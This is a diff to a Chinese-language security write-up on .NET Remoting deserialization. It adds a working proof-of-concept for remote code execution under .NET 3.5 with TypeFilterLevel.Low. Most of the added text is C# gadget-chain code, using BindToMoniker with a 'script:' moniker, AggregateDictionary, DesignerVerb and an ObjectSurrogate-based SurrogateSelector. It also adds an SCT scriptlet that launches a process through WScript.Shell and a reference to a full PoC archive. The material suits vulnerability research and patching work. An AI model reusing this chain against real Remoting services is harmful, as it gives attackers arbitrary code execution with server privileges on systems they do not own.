@@ -389,7 +389,89 @@ public string xamlrcepayload(int asm_index)
 ```
 至此已经解决了TcpServerChannel的TypeFilterLevel.Low模式默认配置下无法实现利用的问题,笔者的poc运行后可以实现以服务端权限执行任意代码.
 
+## .NET 3.5 Remoting反序列化TypeFilterLevel.Low可行方法 ##
+```
 
+                string exedir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+
+                string scriptpath = Path.Combine(exedir, "run.sct");
+
+                string scriptval = @"script:" + scriptpath;
+
+                File.WriteAllText(scriptpath, Resource1.run);
+                
+                string[] e1 = new string[] { scriptval };
+
+
+                //IEnumerable<object> end = CreateWhereSelectEnumerableIterator<string, object>(e1, null, XamlReader.Parse);
+                IEnumerable<object> end = CreateWhereSelectEnumerableIterator<string, object>(e1, null, System.Runtime.InteropServices.Marshal.BindToMoniker);
+
+
+
+                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
+                PagedDataSource pds = new PagedDataSource() { DataSource = end };
+                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
+                // Class is internal so need to use reflection.
+                IDictionary dict = (IDictionary)Activator.CreateInstance(
+                    typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
+
+                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
+                verb = new DesignerVerb("", null);
+                // Need to insert IDictionary using reflection.
+                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance)
+                    .SetValue(verb, dict);
+
+                // Pre-load objects, this ensures they're fixed up before building the hash table.
+                ls = new List<object>();
+                ls.Add(e1);
+                ls.Add(end);
+                ls.Add(pds);
+                ls.Add(verb);
+                ls.Add(dict);
+  public class MySurrogateSelector : SurrogateSelector
+    {
+        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
+        {
+            selector = this;
+            if (!type.IsSerializable)
+            {
+                Console.WriteLine("type.IsSerializable;=>" + type.Name);
+                System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector obj = new System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector();
+
+                foreach (Type tp in obj.GetType().Assembly.GetTypes())
+                {
+                    if (tp.Name.Contains("ObjectSurrogate"))
+                    {
+                        Console.WriteLine(tp.Name);
+                        return (ISerializationSurrogate)Activator.CreateInstance(tp);
+                    }
+                }
+                return obj.GetSurrogate(type, context, out selector);         
+            }
+
+            return base.GetSurrogate(type, context, out selector);
+        }
+
+    }
+```
+run.sct加入资源文件
+```
+<?xml version='1.0'?>
+<package>
+<component id='giffile'>
+<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>
+</registration>
+<script language='JScript'>
+<![CDATA[
+  new ActiveXObject('Wscript.Shell').exec('"C:/Windows/System32/notepad.exe"');
+]]>
+</script>
+</component>
+</package>
+
+
+```
+完整poc在DotNET3Dot5TypeFilterLevelLowRce.7z
 
 ## 运行效果 ##
 
